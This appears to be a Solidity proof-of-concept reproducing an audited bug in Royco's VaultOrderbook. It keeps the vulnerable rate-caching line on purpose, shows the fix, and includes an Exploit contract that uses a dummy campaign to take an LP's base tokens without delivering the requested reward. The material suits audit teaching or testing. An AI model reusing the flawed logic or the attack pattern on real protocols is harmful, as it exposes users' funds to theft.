// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Royco — VaultOrderbook.allocateOrder writes a campaign rate onto the wrong cache key
    (Cantina, Kurt Barry, finding 46677).
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: the campaign loop indexes campaignIds but adds previewRateAfterDeposit
    into tokenToRate[tokensRequested[i]]. A permissionless dummy campaign satisfies the
    LP's requested rate, and the fill pulls the LP's base tokens. The LP receives none
    of the reward token they asked for. Vulnerable line preserved verbatim below (@> VULN). */

contract Token {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount && allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IVault {
    function previewRateAfterDeposit(bytes32 campaignId, uint256 quantity) external view returns (uint256);
    function campaignToToken(bytes32 campaignId) external view returns (address);
}

contract Vault {
    mapping(bytes32 => uint256) public rateOf;
    mapping(bytes32 => address) public tokenOf;

    function setCampaign(bytes32 id, address rewardToken, uint256 rate) external {
        rateOf[id] = rate;
        tokenOf[id] = rewardToken;
    }

    function previewRateAfterDeposit(bytes32 campaignId, uint256) external view returns (uint256) {
        return rateOf[campaignId];
    }

    function campaignToToken(bytes32 campaignId) external view returns (address) {
        return tokenOf[campaignId];
    }
}

contract LP {
    function approveToken(Token token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }
}

contract VaultOrderbook {
    struct Order {
        address ap;
        address targetVault;
        address[] tokensRequested;
        uint256[] tokenRatesRequested;
    }

    Token public base;
    mapping(address => uint256) public tokenToRate;
    uint256 public taken;
    error OrderConditionsNotMet();

    constructor(Token base_) {
        base = base_;
    }

    function allocateOrder(Order calldata order, bytes32[] calldata campaignIds, uint256 quantity) external {
        for (uint256 i = 0; i < campaignIds.length; ++i) {
            // Ensure that the LP could deposit quantity base tokens into the vault and still receive the desired reward rate,
            uint256 rate = IVault(order.targetVault).previewRateAfterDeposit(campaignIds[i], quantity);
            tokenToRate[order.tokensRequested[i]] += rate; // @> VULN: index i walks campaignIds but the cache key is tokensRequested[i]
            // FIX: tokenToRate[IVault(order.targetVault).campaignToToken(campaignIds[i])] += rate;
        }
        for (uint256 i; i < order.tokenRatesRequested.length; ++i) {
            if (order.tokenRatesRequested[i] > tokenToRate[order.tokensRequested[i]]) {
                revert OrderConditionsNotMet();
            }
            delete tokenToRate[order.tokensRequested[i]];
        }
        base.transferFrom(order.ap, msg.sender, quantity);
        taken = quantity;
    }

    function allocateOrderFixed(Order calldata order, bytes32[] calldata campaignIds, uint256 quantity) external {
        for (uint256 i = 0; i < campaignIds.length; ++i) {
            uint256 rate = IVault(order.targetVault).previewRateAfterDeposit(campaignIds[i], quantity);
            tokenToRate[IVault(order.targetVault).campaignToToken(campaignIds[i])] += rate;
        }
        for (uint256 i; i < order.tokenRatesRequested.length; ++i) {
            if (order.tokenRatesRequested[i] > tokenToRate[order.tokensRequested[i]]) {
                revert OrderConditionsNotMet();
            }
            delete tokenToRate[order.tokensRequested[i]];
        }
        base.transferFrom(order.ap, msg.sender, quantity);
        taken = quantity;
    }
}

contract Exploit {
    Token public base; // nonce 1
    Token public realReward; // nonce 2
    Token public dummy; // nonce 3
    Vault public vault; // nonce 4
    VaultOrderbook public book; // nonce 5
    LP public lp; // nonce 6
    uint256 public profit;

    constructor() {
        base = new Token("BASE");
        realReward = new Token("REAL");
        dummy = new Token("DUMMY");
        vault = new Vault();
        book = new VaultOrderbook(base);
        lp = new LP();
    }

    function _order() internal view returns (VaultOrderbook.Order memory order, bytes32[] memory campaigns) {
        address[] memory tokens = new address[](1);
        tokens[0] = address(realReward);
        uint256[] memory rates = new uint256[](1);
        rates[0] = 100 ether;
        order = VaultOrderbook.Order({
            ap: address(lp),
            targetVault: address(vault),
            tokensRequested: tokens,
            tokenRatesRequested: rates
        });
        campaigns = new bytes32[](1);
        campaigns[0] = keccak256("dummy");
    }

    function run() external {
        bytes32 realId = keccak256("real");
        bytes32 dummyId = keccak256("dummy");
        vault.setCampaign(realId, address(realReward), 0);
        vault.setCampaign(dummyId, address(dummy), 1000 ether);
        base.mint(address(lp), 1000 ether);
        lp.approveToken(base, address(book), 1000 ether);
        (VaultOrderbook.Order memory order, bytes32[] memory campaigns) = _order();
        book.allocateOrder(order, campaigns, 1000 ether);
        uint256 got = base.balanceOf(address(this));
        base.transfer(msg.sender, got);
        profit = base.balanceOf(msg.sender);
        require(profit == 1000 ether, "lp deposit not taken");
        require(realReward.balanceOf(address(lp)) == 0, "lp received the requested token");
        require(book.taken() == 1000 ether, "order not filled");
    }

    function runFixed() external {
        vault.setCampaign(keccak256("real"), address(realReward), 0);
        vault.setCampaign(keccak256("dummy"), address(dummy), 1000 ether);
        base.mint(address(lp), 1000 ether);
        lp.approveToken(base, address(book), 1000 ether);
        (VaultOrderbook.Order memory order, bytes32[] memory campaigns) = _order();
        book.allocateOrderFixed(order, campaigns, 1000 ether);
    }
}
